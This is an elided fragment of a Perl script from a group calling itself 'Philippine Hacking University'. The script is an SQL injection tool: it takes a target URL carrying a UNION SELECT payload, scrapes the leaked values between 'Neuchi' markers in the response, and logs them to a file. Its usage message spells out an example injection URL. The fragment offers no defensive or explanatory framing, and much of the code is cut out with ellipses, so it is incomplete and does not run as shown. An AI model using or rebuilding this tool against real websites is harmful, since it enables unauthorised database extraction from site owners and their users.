#!/usr/bin/perl
# Neuchi
# PHU:Philippine Hacking University
...
GetOptions(
    'url|u=s' => \$url,
	 ...
	 if ($site =~ /(.*)1337(.*)/i)
     {
         ...
         if ($content =~ /Neuchi(.*)Neuchi(.*)Neuchi(.*)Neuchi/)
         {					  
	 ...
	 else { die("[X] Please enter a target like this:\nhttp://target..co.li/index.php?id=0+union+select+1,2,1337,3\n");	 
	  }

	sub cr0t {
    my $value = $_[0];
    open(LOG,">>result_sql.txt") or die(" [x] Unable to create or open file log.\n");
    print LOG "$value";
    close(LOG);
    print $value;
}
